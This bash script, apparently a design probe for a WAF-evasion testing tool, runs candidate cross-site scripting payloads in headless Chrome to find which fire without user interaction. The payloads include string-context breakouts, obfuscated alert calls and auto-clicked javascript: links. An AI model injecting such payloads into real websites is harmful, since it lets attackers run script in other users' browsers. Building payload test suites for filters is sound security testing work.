#!/usr/bin/env bash
# One-off: detonate candidate context-breakout payloads in real Chrome to see
# which auto-fire (no interaction) BEFORE baking them into a build-gating
# self-test. Each payload is wrapped exactly as the reflect-origin would for its
# context. Not part of the shipped catalog — a design probe.
set -u
D="${WAFRIFT_DETONATE_BIN:-/tmp/wafrift-exec/detonate}"

fire() { # name  wrapped-html
  local out
  out="$(printf '%s' "$2" | "$D" --url http://reflect/ --engine chrome 2>/dev/null)"
  printf '%-22s %s\n' "$1" "${out:-<no-output>}"
}

# JS double-quoted string context: <script>var t="PAYLOAD";...</script>
fire js-dq-plain        '<script>var t="";alert(1)//";</script>'
fire js-dq-arith        '<script>var t=""-alert(1)-"";</script>'
fire js-dq-fromcharcode '<script>var t="";window[String.fromCharCode(97,108,101,114,116)](1)//";</script>'
fire js-dq-concat       '<script>var t="";window["al"+"ert"](1)//";</script>'
fire js-dq-scriptbridge '<script>var t="</script><svg onload=alert(1)>";</script>'
# JS single-quoted string context
fire js-sq-plain        "<script>var t='';alert(1)//';</script>"
fire js-sq-concat       "<script>var t='';window['al'+'ert'](1)//';</script>"
# javascript: URI context, auto-clicked
fire uri-click          '<a id="lnk" href="javascript:alert(1)">go</a><script>document.getElementById("lnk").click()</script>'
fire uri-concat-click   '<a id="lnk" href="javascript:window[%27al%27+%27ert%27](1)">go</a><script>document.getElementById("lnk").click()</script>'
# Attribute contexts
fire attr-autofocus     '<input value="" autofocus onfocus=alert(1) x="">'
fire attr-tagbreak      '<input value=""><svg onload=alert(1)>">'
fire attr-sq-autofocus  "<input value='' autofocus onfocus=alert(1) x=''>"
# Sanity control: known-firing bare vector
fire control-svg        '<svg onload=alert(1)>'
